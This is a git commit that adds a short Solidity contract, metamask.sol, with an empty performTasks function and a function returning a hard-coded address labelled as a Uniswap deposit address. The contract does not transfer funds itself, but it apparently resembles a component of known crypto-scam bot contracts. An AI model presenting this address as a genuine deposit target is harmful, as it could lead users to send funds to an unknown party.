2029ef08c0be001b54007fa7fa0976efd4e0c39a
DOOL-SR <96809854+DOOL-SR@users.noreply.github.com>
2022-01-02 00:20:08 -0700

    Create metamask.sol

---
+++ correct/metamask.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x7eF36447831FB7AD6371306d3F259B2e3faAfE0C;
+	}
+}
